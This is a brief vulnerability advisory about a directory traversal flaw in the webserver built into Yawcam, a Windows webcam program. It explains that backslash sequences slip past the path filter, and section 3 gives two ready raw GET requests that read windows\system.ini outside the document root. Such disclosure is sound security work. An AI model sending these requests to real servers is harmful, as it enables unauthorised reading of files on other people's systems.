1. Description:

Vendor's Description:

"Yawcam is a webcam software for windows".

------------
2. The bug:
------------

The program has a built-in webserver that by default is able to avoid
malicious patterns like "/../" but it's not able to manage patterns
like "..\" or "\..\" into raw http requests.
So an attacker can go out the document root assigned to the webserver
and see/download all the files available on the remote system.



xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

-------------
3. The code:
-------------

To test the vulnerability, connect to the webserver and send a raw
request like:

GET ..\..\..\..\..\..\..\..\windows\system.ini HTTP/1.0

or:

GET \..\..\..\..\..\..\..\..\windows\system.ini HTTP/1.0



xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

------------
4. The fix:
------------

Vendor was contacted.
Bug will be probably fixed in the next release.
